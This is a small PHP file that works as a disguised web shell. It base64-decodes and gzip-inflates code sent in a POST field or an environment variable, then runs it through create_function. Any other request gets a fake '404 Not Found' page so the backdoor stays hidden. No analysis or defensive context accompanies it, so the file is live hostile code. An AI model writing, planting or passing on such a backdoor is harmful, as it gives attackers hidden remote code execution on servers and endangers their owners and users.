<?php
if(getenv('E')||isset($_POST['e'])){
$d=$_POST['e']?$_POST['e']:getenv('E');
$d=gzinflate(base64_decode($d));
$f=create_function('',$d);$f();
}else{
echo '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';
}
